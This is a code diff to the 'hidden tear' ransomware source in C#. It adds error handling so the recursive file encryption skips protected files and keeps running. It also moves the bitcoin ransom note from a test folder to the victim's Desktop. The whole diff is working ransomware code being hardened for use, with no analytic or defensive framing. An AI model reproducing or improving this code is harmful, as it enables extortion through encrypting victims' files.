@@ -144,29 +144,38 @@ namespace hidden_tear
         }
 
         //encrypts target directory
+        //added try & catch to manage UnauthorizedAccessException exception while encrypting files
         public void encryptDirectory(string location, string password)
         {
             
             //extensions to be encrypt
             var validExtensions = new[]
             {
-                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
+                ".txt"//, ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
             };
 
             string[] files = Directory.GetFiles(location);
             string[] childDirectories = Directory.GetDirectories(location);
             for (int i = 0; i < files.Length; i++){
-                string extension = Path.GetExtension(files[i]);
-                if (validExtensions.Contains(extension))
-                {
-                    EncryptFile(files[i],password);
+                try {
+                    string extension = Path.GetExtension(files[i]);
+                    if (validExtensions.Contains(extension))
+                    {
+                        EncryptFile(files[i],password);
+                    }
+                } catch (UnauthorizedAccessException ex) {
+                    continue;
                 }
             }
+
+                
             for (int i = 0; i < childDirectories.Length; i++){
-                encryptDirectory(childDirectories[i],password);
+                try {
+                    encryptDirectory(childDirectories[i],password);
+                } catch (UnauthorizedAccessException ex) {
+                    continue;
+                }
             }
-            
-            
         }
 
         public void startAction()
@@ -183,7 +192,7 @@ namespace hidden_tear
 
         public void messageCreator()
         {
-            string path = "\\Desktop\\test\\READ_IT.txt";
+            string path = "\\Desktop\\READ_IT.txt";
             string fullpath = userDir + userName + path;
             string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
             System.IO.File.WriteAllLines(fullpath, lines);
